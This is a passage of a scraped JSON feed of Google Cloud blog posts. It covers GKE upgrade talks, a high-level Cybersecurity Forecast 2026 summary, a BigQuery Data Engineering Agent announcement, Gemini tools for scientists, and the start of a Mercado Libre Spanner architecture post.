rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Accelerating Innovation: The Evolution of Kubernetes and the Road Ahead</span></a><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">with Jago Macleod (Google)</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://sched.co/27FXC\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Upgrade Nightmare To Uptime Dream: The Cloud Provider's Playbook for Critical Kubernetes Work</span><span style=\"vertical-align: baseline;\"> with </span></a><span style=\"vertical-align: baseline;\">Yuchen Zhou (Google) &amp; Uttam Kumar (Salesforce).</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://sched.co/28aCs\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Navigating the Multi-Version Kubernetes Universe: How Emulation Version Shapes Your Contributions</span></a><span style=\"vertical-align: baseline;\"> with Siyuan Zhang (Google) at the Maintainer Summit</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://rsvp.withgoogle.com/events/google-cloud-at-kubecon-north-america-2025\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">GKE Upgrade: A New Era of Safety and Control</span></a><span style=\"vertical-align: baseline;\"> with Wenjia Zhang (Google) at booth #200</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">Get started</strong></h3>\n<p><span style=\"vertical-align: baseline;\">This is what it looks like when open-source innovation and managed-service excellence come together. This new, safer upgrade feature is coming soon in GKE 1.33. To learn more about managing your clusters, check out the </span><a href=\"https://docs.cloud.google.com/kubernetes-engine/upgrades\"><span style=\"text-decoration: underline; vertical-align: baseline;\">GKE documentation</span></a><span style=\"vertical-align: baseline;\">.</span></p></div>",
        "published_date": "2025-11-04 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/threat-intelligence/cybersecurity-forecast-2026/",
        "title": "Preparing for Threats to Come: Cybersecurity Forecast 2026",
        "thumbnail": null,
        "author": "Adam Greenberg",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Every November, we make it our mission to equip organizations with the knowledge needed to stay ahead of threats we anticipate in the coming year. The Cybersecurity Forecast 2026 report, released today, provides comprehensive insights to help security leaders and teams prepare for those challenges.</span></p>\n<p><span style=\"vertical-align: baseline;\">This report does not contain \"crystal ball\" predictions. Instead, our forecasts are built on real-world trends and data we are observing right now. The information contained in the report comes directly from Google Cloud security leaders, and dozens of experts, analysts, researchers, and responders directly on the frontlines.</span></p></div>\n<div class=\"block-aside\"><dl>\n    <dt>aside_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;title&#x27;, &#x27;Cybersecurity Forecast 2026&#x27;), (&#x27;body&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fe16e7e4f40&gt;), (&#x27;btn_text&#x27;, &#x27;Download now&#x27;), (&#x27;href&#x27;, &#x27;https://cloud.google.com/security/resources/cybersecurity-forecast?&amp;utm_source=cgc-blog&amp;utm_medium=blog&amp;utm_campaign=FY25-Q4-GLOBAL-ENT37011-website-dl-cyber-forecast-124843&amp;utm_content=launch_blog&amp;utm_term=-&#x27;), (&#x27;image&#x27;, &lt;GAEImage: forecast 2026 cover&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Artificial Intelligence, Cybercrime, and Nation States</span></h3>\n<p><span style=\"vertical-align: baseline;\">Cybersecurity in the year ahead will be defined by rapid evolution and refinement by adversaries and defenders. Defenders will leverage artificial intelligence and agentic AI to protect against increasingly sophisticated and disruptive cybercrime operations, nation-state actors persisting on networks for long periods of time to conduct espionage and achieve other strategic goals, and adversaries who are also embracing artificial intelligence to scale and speed up attacks.</span></p>\n<h4><span style=\"vertical-align: baseline;\">AI Threats</span></h4>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>Adversaries Fully Embrace AI:</strong> We anticipate threat actors will move decisively from using AI as an exception to using it as the norm. They will leverage AI to enhance the speed, scope, and effectiveness of operations, streamlining and scaling attacks across the entire lifecycle.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>Prompt Injection Risks:</strong> A critical and growing threat is prompt injection, an attack that manipulates AI to bypass its security protocols and follow an attacker's hidden command. Expect a significant rise in targeted attacks on enterprise AI systems.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>AI-Enabled Social Engineering:</strong> Threat actors will accelerate the use of highly manipulative AI-enabled social engineering. This includes vishing (voice phishing) with AI-driven voice cloning to create hyperrealistic impersonations of executives or IT staff, making attacks harder to detect and defend against.</span></p>\n</li>\n</ul>\n<h4><span style=\"vertical-align: baseline;\">AI Advantages</span></h4>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>AI Agent Paradigm Shift:</strong> Widespread adoption of AI agents will create new security challenges, requiring organizations to develop new methodologies and tools to effectively map their new AI ecosystems. A key part of this will be the evolution of identity and access management (IAM) to treat AI agents as distinct digital actors with their own managed identities.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>Supercharged Security Analysts:</strong> AI adoption will transform security analysts’ roles, shifting them from drowning in alerts to directing AI agents in an “Agentic SOC.” This will allow analysts to focus on strategic validation and high-level analysis, as AI handles data correlation, incident summaries, and threat intelligence drafting.</span></p>\n</li>\n</ul>\n<h4><span style=\"vertical-align: baseline;\">Cybercrime</span></h4>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>Ransomware and Extortion:</strong> The combination of ransomware, data theft, and multifaceted extortion will remain the most financially disruptive category of cybercrime. The volume of activity is escalating, with focus on targeting third-party providers and exploiting zero-day vulnerabilities for high-volume data exfiltration.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>The On-Chain Cybercrime Economy:</strong> As the financial sector increasingly adopts cryptocurrencies, threat actors are expected to migrate core components of their operations onto public blockchains for unprecedented resilience against traditional takedown efforts.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>Virtualization Infrastructure Under Threat:</strong> As security controls mature in guest operating systems, adversaries are pivoting to the underlying virtualization infrastructure, which is becoming a critical blind spot. A single compromise here can grant control over the entire digital estate and render hundreds of systems inoperable in a matter of hours.</span></p>\n</li>\n</ul>\n<h4><span style=\"vertical-align: baseline;\">Nation States</span></h4>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>Russia:</strong> Cyber operations are expected to undergo a strategic shift, prioritizing long-term global strategic goals and the development of advanced cyber capabilities over just tactical support for the conflict in Ukraine.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>China:</strong> The volume of China-nexus cyber operations is expected to continue surpassing that of other nations. They will prioritize stealthy operations, aggressively targeting edge devices and exploiting zero-day vulnerabilities.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>Iran:</strong> Driven by regional conflicts and the goal of regime stability, Iranian cyber activity will remain resilient, multifaceted, and semi-deniable, deliberately blurring the lines between espionage, disruption, and hacktivism.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>North Korea:</strong> They will continue to conduct financial operations to generate revenue for the regime, cyber espionage against perceived adversaries, and seek to expand IT worker operations.</span></p>\n</li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\">Be Prepared for 2026</span></h3>\n<p><span style=\"vertical-align: baseline;\">Understanding threats is key to staying ahead of them. Read the <a href=\"https://cloud.google.com/security/resources/cybersecurity-forecast?&amp;utm_source=cgc-blog&amp;utm_medium=blog&amp;utm_campaign=FY25-Q4-GLOBAL-ENT37011-website-dl-cyber-forecast-124843&amp;utm_content=launch_blog&amp;utm_term=-\">full Cybersecurity Forecast 2026 report</a> for a more in-depth look at the threats covered in this blog post. We have also released special reports that dive into some of the threats and challenges unique to <a href=\"https://services.google.com/fh/files/misc/cybersecurity-forecast-2026-emea-en.pdf\" rel=\"noopener\" target=\"_blank\">EMEA</a> and <a href=\"https://services.google.com/fh/files/misc/cybersecurity-forecast-2026-japac-en.pdf\" rel=\"noopener\" target=\"_blank\">JAPAC</a> organizations.</span></p>\n<p><span style=\"vertical-align: baseline;\">For an even deeper look at the threat landscape next year, register for our <a href=\"https://www.brighttalk.com/webcast/18282/654496?&amp;utm_source=cgc-blog&amp;utm_medium=blog&amp;utm_campaign=FY25-Q4-global-ENT37011-onlineevent-er-dgcsm-Cybersecurity-Forecast-2026&amp;utm_content=launch_blog&amp;utm_term=-\" rel=\"noopener\" target=\"_blank\">Cybersecurity Forecast 2026 webinar</a>, which will be hosted once again by threat expert Andrew Kopcienski.</span></p></div>",
        "published_date": "2025-11-04 14:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/data-analytics/exploring-the-data-engineering-agent-in-bigquery/",
        "title": "The Data Engineering Agent is now in preview",
        "thumbnail": null,
        "author": "Varun Chandra",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Data is the lifeblood of the modern enterprise, but the process of making it useful is often fraught with friction. Data engineers, analysts, and scientists—some of the most skilled and valuable talent in any organization—are spending a disproportionate amount of their time on repetitive, low-impact tasks. What if you could shift your focus from manually building and maintaining pipelines to defining the best practices and rules that automate them?</span></p>\n<p><span style=\"vertical-align: baseline;\">Today, we’re announcing a fundamental shift to solve this challenge. We're excited to announce the preview of the </span><strong style=\"vertical-align: baseline;\">Data Engineering Agent in BigQuery</strong><span style=\"vertical-align: baseline;\">, a first-party agent designed to automate the most complex and time-consuming data engineering tasks, powered by Gemini.</span></p>\n<p><span style=\"vertical-align: baseline;\">The Data Engineering Agent isn't just an incremental improvement; it's fundamentally transforming the way we work, with truly autonomous data engineering operations. According to IDC, ‘</span><span style=\"font-style: italic; vertical-align: baseline;\">GenAI and other automation solutions will drive over $1 trillion in productivity gains for companies by 2026</span><span style=\"vertical-align: baseline;\">’<sup>1</sup></span><span style=\"font-style: italic; vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">Here is a closer look at the powerful capabilities you can access today:</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Pipeline development and maintenance</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The Data Engineering Agent makes it easy to build and maintain robust data pipelines. The agent is available in </span><a href=\"https://cloud.google.com/bigquery/docs/pipelines-introduction\"><span style=\"text-decoration: underline; vertical-align: baseline;\">BigQuery pipelines</span></a><span style=\"vertical-align: baseline;\"> and it can help you with:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Natural language pipeline creation:</strong><span style=\"vertical-align: baseline;\"> Describe your pipeline requirements in plain language, and the agent generates the necessary SQL code, adhering to data engineering best practices that you can customize through instruction files. For example: \"</span><span style=\"font-style: italic; vertical-align: baseline;\">Create a pipeline to load data from the 'customer_orders' bucket, standardize the date formats, remove duplicate entries, and load it into a BigQuery table named 'clean_orders'</span><span style=\"vertical-align: baseline;\">.”</span></p>\n</li>\n</ul>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Intelligent pipeline modification:</strong><span style=\"vertical-align: baseline;\"> Need to update an existing pipeline? Just tell the agent what you want to change. It analyzes the existing code, and proposes the necessary modifications, leaving you to simply review and approve the changes. For example, you can ask it to \"</span><span style=\"font-style: italic; vertical-align: baseline;\">Create a pipeline to load data from the 'customer_orders' bucket, standardize the date formats, remove duplicate entries, and load it into a BigQuery table named 'clean_orders'.</span><span style=\"vertical-align: baseline;\">\" The agent follows best-practice design principles and helps you optimize and redesign your existing pipelines to eliminate redundant operations, as well as to leverage BigQuery's query optimization features such as partitioning.</span></p>\n</li>\n</ul>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/dataplex/docs/introduction\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Dataplex Universal Catalog</strong></a><strong style=\"vertical-align: baseline;\"> integration:</strong><span style=\"vertical-align: baseline;\"> The agent leverages Google Cloud’s Dataplex data governance offering. It automatically retrieves additional resource metadata such as business glossaries and data profiles from Dataplex to improve the relevance, table-metadata generation (new tables) and performance of the generated pipelines. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Custom agent instructions and logic:</strong><span style=\"vertical-align: baseline;\"> Incorporate your unique business logic and engineering best practices by providing custom instructions and leveraging User-Defined Functions (UDFs) within the pipeline.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Automated code documentation:</strong><span style=\"vertical-align: baseline;\"> The agent automatically generates clear and concise documentation for your pipelines along with column descriptions, making them easier to understand and maintain for the entire team.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Spanish-language news and entertainment group PRISA Media and early access customer has had a positive experience with the Data Engineering Agent. </span></p>\n<p style=\"padding-left: 40px;\"><span style=\"vertical-align: baseline;\">“</span><span style=\"font-style: italic; vertical-align: baseline;\">The agent provides solutions that enable us to explore new development approaches, showing strong potential to address complex data engineering tasks. It demonstrates an impressive ability to correctly interpret our requirements, even for sophisticated data modeling tasks like creating SCD Type 2 dimensions. In its current state, it already delivers value in automating maintenance and small optimizations, and we believe it has the foundation to become a truly distinctive tool in the future.</span><span style=\"vertical-align: baseline;\">” - Fernando Calo, Lead Data Engineer at the Spanish-language news and entertainment group PRISA</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Data preparation, transformation and modeling</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The first step in any data project is often the most time-consuming: understanding, preparing, and cleaning raw data. The Data Engineering Agent allows you, for example, to access raw files from Google Cloud Storage. It automatically cleans, deduplicates, formats and standardizes your data based on the provided instructions. Integration with Dataplex allows you to generate data quality assertions based on rules defined in the Dataplex repository and automatically encrypt columns that were flagged as containing Personally Identifiable Information (PII). No more writing complex queries to identify data quality issues or to standardize formats.</span></p>\n<p><span style=\"vertical-align: baseline;\">The agent can then generate the necessary code to perform essential data transformation tasks, significantly reducing the time it takes to get your data ready for analysis. This process covers operations like joining and aggregating datasets.</span></p>\n<p><span style=\"vertical-align: baseline;\">The agent assists with complex data modeling, too. You can use natural language prompts to generate sophisticated schemas, such as Data Vault or Star Schemas, directly from your source tables.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1 - CleanPrepare\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/original_images/1_-_CleanPrepare.gif\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Pipeline troubleshooting</strong></h3>\n<p><span style=\"vertical-align: baseline;\">When issues arise, the Data Engineering Agent can help you quickly identify and resolve them. Instead of manually digging through logs and code, you invoke the agent to diagnose the problem. The Data Engineering Agent is integrated with </span><a href=\"https://cloud.google.com/products/gemini/cloud-assist\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini Cloud Assist</span></a><span style=\"vertical-align: baseline;\">. It analyzes the execution logs, identifies the root cause of the failure, and suggests a solution, helping you get your pipelines back up and running in record time.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"2 - troubleshoot (1)\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/original_images/2_-_troubleshoot_1.gif\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Pipeline migrations</strong></h3>\n<p><span style=\"vertical-align: baseline;\">For teams looking to modernize their data stack, the Data Engineering Agent can speed up the transition to a unified Google Cloud data platform. That’s what happened at Vodafone as it migrated to BigQuery. </span></p>\n<p style=\"padding-left: 40px;\"><span style=\"vertical-align: baseline;\">“</span><span style=\"font-style: italic; vertical-align: baseline;\">During the migration journey to a Dataform environment, the Data Engineer Agent successfully replicated all existing data and transformations scripts with 100% automation and zero manual intervention. This achievement resulted in a </span><strong style=\"font-style: italic; vertical-align: baseline;\">90% reduction</strong><span style=\"font-style: italic; vertical-align: baseline;\"> in the time typically required for manual ETL migration, significantly accelerating the transition.</span><span style=\"vertical-align: baseline;\">\" - Chris Benfield, Head of Engineering, Vodafone</span></p>\n<p><span style=\"vertical-align: baseline;\">Customers have already migrated onto BigQuery pipelines to:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Standardize and unify code:</strong><span style=\"vertical-align: baseline;\"> If you're looking to consolidate your processing engines, the agent helps you to standardize on BigQuery pipelines. Simply provide the agent with your existing code, and it will generate the equivalent, optimized BigQuery pipeline, reducing operational complexity and cost.</span></p>\n</li>\n</ul>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Migrate from legacy tools:</strong><span style=\"vertical-align: baseline;\"> The agent can translate proprietary formats and configurations from legacy data processing tools into native BigQuery pipelines.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">The road ahead</strong></h3>\n<p><span style=\"vertical-align: baseline;\">This is just the beginning for the Data Engineering Agent. We are continuously working to expand its capabilities to address more challenges faced by data engineering teams. In the future, you can expect to see the agent extend its reach to include proactive troubleshooting, IDE integration, and pipeline orchestration in Cloud Composer. </span></p>\n<h3><strong style=\"vertical-align: baseline;\">Get started today</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The BigQuery Data Engineering Agent is available now. We are excited to see how you integrate this new intelligent partner into your daily work.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Ready to transform your data engineering workflows?</strong></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Access the agent:</strong><span style=\"vertical-align: baseline;\"> Navigate to BigQuery Pipelines in BigQuery Studio or the Dataform UI. The Data Engineering Agent is accessible via the ‘Ask Agent’ button.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Learn more:</strong><span style=\"vertical-align: baseline;\"> Review the </span><a href=\"https://docs.cloud.google.com/bigquery/docs/data-engineering-agent-pipelines\"><span style=\"text-decoration: underline; vertical-align: baseline;\">official documentation</span></a><span style=\"vertical-align: baseline;\"> for setup instructions and best practices.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Feedback:</strong><span style=\"vertical-align: baseline;\"> Email us at </span><a href=\"mailto:bigquery-dea-feedback@google.com\"><span style=\"text-decoration: underline; vertical-align: baseline;\">bigquery-dea-feedback@google.com</span></a></p>\n</li>\n</ol>\n<hr />\n<p><sup><em>1. IDC Market Perspective, GenAI's Impact on Enterprise Software, #US52547624, September 2024</em></sup></p></div>",
        "published_date": "2025-11-03 18:30:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/ai-machine-learning/how-scientists-can-use-gemini-enterprise-for-ai-workflows/",
        "title": "How scientists can leverage AI agents using Gemini Enterprise, Gemini Code Assist, and Gemini CLI",
        "thumbnail": null,
        "author": "Jay Boisseau",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Scientific inquiry has always been a journey of curiosity, meticulous effort, and groundbreaking discoveries. Today, that journey is being redefined, fueled by the incredible capabilities of AI. It’s moving beyond simply processing data to actively participating in every stage of discovery, and Google Cloud is at the forefront of this transformation, building the tools and platforms that make it possible. </span></p>\n<p><span style=\"vertical-align: baseline;\">The sheer volume of data generated by modern research is immense, often too vast for human analysis alone. This is where AI steps in, not just as a tool, but as a collaborative force. We’re seeing powerful new models and AI agents assist with everything from identifying relevant literature and generating novel hypotheses to designing experiments, running simulations, and making sense of complex results. This collaboration doesn’t replace human intellect; it amplifies it, allowing researchers to explore more avenues, more quickly, and with greater precision. </span></p>\n<p><span style=\"vertical-align: baseline;\">At Google Cloud, we’re bringing together high-performance computing (HPC) and advanced AI on a single, integrated platform. This means you can seamlessly move from running massive-scale simulations to applying sophisticated machine learning models, all in one environment. </span></p>\n<p><span style=\"vertical-align: baseline;\">So, how can you leverage these capabilities to get to insights faster? The journey begins at the foundation of scientific inquiry: the hypothesis.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">AI-enhanced scientific inquiry</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Every great discovery starts with a powerful hypothesis. With millions of research papers published annually, identifying novel opportunities is a monumental task. To overcome this information overload, scientists can now turn to AI as a powerful research partner.</span></p>\n<p><span style=\"vertical-align: baseline;\">Our </span><a href=\"https://cloud.google.com/agentspace/docs/research-assistant\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Deep Research</span></a><span style=\"vertical-align: baseline;\"> agent tackles the first step: performing a comprehensive analysis of published literature to produce detailed reports on a given topic that would otherwise take months to compile. Building on that foundation, our </span><a href=\"https://cloud.google.com/agentspace/docs/idea-generation\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Idea Generation agent</span></a><span style=\"vertical-align: baseline;\"> then deploys an ensemble of AI collaborators to brainstorm, evaluate, propose, debate, and rank novel hypotheses. This powerful combination, available in </span><a href=\"https://cloud.google.com/gemini-enterprise?_gl=1*9qpvwe*_up*MQ..&amp;gclid=EAIaIQobChMIptGF-7qrkAMVRyvUAR0VwSw1EAAYASAAEgIZMPD_BwE&amp;gclsrc=aw.ds#module-7\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini Enterprise</span></a><span style=\"vertical-align: baseline;\">, transforms the initial phase of scientific inquiry, empowering researchers to augment their expertise and find connections they might otherwise miss.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Go from hypothesis to results, faster</strong></p>\n<p><span style=\"vertical-align: baseline;\">Once a hypothesis is formed, the work of translating it into executable code begins. This is where AI coding assistants, such as </span><a href=\"https://codeassist.google/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini Code Assist</span></a><span style=\"vertical-align: baseline;\">, excel. They automate the tedious tasks of writing analysis scripts and simulation models by generating code from natural language and providing real-time suggestions, dramatically speeding up the core development process. </span></p>\n<p><span style=\"vertical-align: baseline;\">But modern research is more than just a single script; it’s a complete workflow of data, environments, and results managed from the command line. For this, </span><a href=\"https://cloud.google.com/gemini/docs/codeassist/gemini-cli\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini CLI</span></a><span style=\"vertical-align: baseline;\"> brings that same conversational power directly to your terminal. It acts as the ultimate workflow accelerator, allowing you to instantly synthesize research and generate hypotheses with simple commands, then seamlessly transition to experimentation by generating sophisticated analysis scripts, and debugging errors on the fly, all without ever breaking your focus. Gemini CLI can further accelerate your path to impact by transforming raw results into publication-ready text, generating the code for figures and tables, and refining your work for submission. </span></p>\n<p><span style=\"vertical-align: baseline;\">This capability extends to automating the entire research environment. Beyond single commands, Gemini CLI can manage complex, multi-step processes like cloning a scientific application, installing its dependencies, and then building and testing it—all with a simple prompt, maximizing your productivity.</span></p>\n<p><strong style=\"vertical-align: baseline;\">The new era of discovery: Your expertise, AI agents, and Google Cloud</strong></p>\n<p><span style=\"vertical-align: baseline;\">The new era of scientific discovery is here. By embedding AI into every stage of the scientific process - from sparking the initial idea to accelerating the final analysis - Google Cloud provides a single, unified platform for discovery. This new era of AI-enhanced scientific inquiry is built on a robust, intelligent infrastructure that combines the strengths of HPC simulation and AI. This includes purpose-built solutions like our H4D VMs optimized for scientific simulations, alongside the latest A4 and A4X VMs, powered by the latest NVIDIA GPUs, and Google Cloud Managed Lustre, a parallel file system that eliminates storage bottlenecks and allows your HPC and AI workloads to create and analyze massive datasets simultaneously. We provide the power to streamline the entire process so you can focus on scientific creativity - and changing the world! </span></p>\n<p><span style=\"vertical-align: baseline;\">Join the </span><a href=\"https://sites.google.com/view/advancedcomputingcommunity/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud Advanced Computing Community</span></a><span style=\"vertical-align: baseline;\"> to connect with other researchers, share best practices, and stay up to date on the latest advancements in AI for scientific and technical computing, or </span><a href=\"https://cloud.google.com/contact\"><span style=\"text-decoration: underline; vertical-align: baseline;\">contact sales</span></a><span style=\"vertical-align: baseline;\"> to get started today. </span></p></div>",
        "published_date": "2025-11-03 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/retail/inside-mercado-libres-multi-faceted-spanner-foundation-for-scale-and-ai/",
        "title": "Inside Mercado Libre's multi-faceted Spanner architecture",
        "thumbnail": null,
        "author": "Pablo Leopoldo Arrojo",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><a href=\"https://mercadolibre.com/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Mercado Libre</span></a><span style=\"vertical-align: baseline;\">, the e-commerce and fintech pioneer of Latin America, operates at a staggering scale, demanding an infrastructure that's not just resilient and scalable, but also a catalyst for rapid innovation. While our use of </span><a href=\"https://cloud.google.com/spanner\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Spanner</span></a><span style=\"vertical-align: baseline;\"> for foundational consistency and scale is known, a deeper dive reveals a sophisticated, multi-layered strategy. Spanner is not just a database here; it's a core engine powering our internal developer platform, diverse data models, advanced analytics loops, intelligent features, and even our roadmap for next-generation AI applications.</span></p>\n<p><span style=\"vertical-align: baseline;\">This blog explores the technical underpinnings of how Mercado Libre leverages Spanner in concert with our internal innovations like the Fury platform, achieving significant business impact and charting a course for an AI-driven future.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">The dual challenge: internet-scale operations and developer velocity</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Mercado Libre faces the classic challenges of internet-scale services: keeping millions of daily financial transactions safe, making it easy for developers to build apps, and maintaining near-perfect uptime. The solution required a database powerful enough for the core and an abstraction layer elegant enough for broad developer adoption.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Fury: Mercado Libre's developer gateway</strong></h3>\n<p><span style=\"vertical-align: baseline;\">At the heart of Mercado Libre's strategy is </span><strong style=\"vertical-align: baseline;\">Fury</strong><span style=\"vertical-align: baseline;\">, our in-house middleware platform. Fury is designed to abstract away the complexities of various backend technologies, providing developers with standardized, simplified interfaces to build applications. </span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Abstraction &amp; Standardization:</strong><span style=\"vertical-align: baseline;\"> Fury allows development teams to focus on business logic rather than the nuances of distributed database management, schema design for specific engines, or optimal connection pooling.</span></p>\n</li>\n<li><strong style=\"vertical-align: baseline;\">Spanner as the Reliable Core:</strong><span style=\"vertical-align: baseline;\"> Spanner is an a</span><span style=\"vertical-align: baseline;\">lways-on, globally consistent, multi-model database with virtually unlimited scale.</span><span style=\"font-style: italic; vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">By designating Spanner as a choice within Fury, Mercado Libre ensures that applications built on the platform using Spanner  inherit its best features – they stay consistent globally, scale without breaking, and rarely go down.</span></li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/1_Rd8yefF.max-1000x1000.jpg\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Fig. 1 - Fury’s core services</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Spanner – the versatile backbone</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Through Fury, Spanner empowers Mercado Libre's developers with remarkable versatility. Some apps need complex transactions, others need fast lookups. Spanner handles both, which means teams can use just one system:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Relational prowess for complex transactions:</strong><span style=\"vertical-align: baseline;\"> For sophisticated transactional workloads like order management, payments, and inventory systems, Spanner’s relational capabilities (SQL, ACID transactions, joins) remain critical. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">High-performance key-value store:</strong><span style=\"vertical-align: baseline;\"> Many modern applications require fast point lookups and simple data structures. </span><span 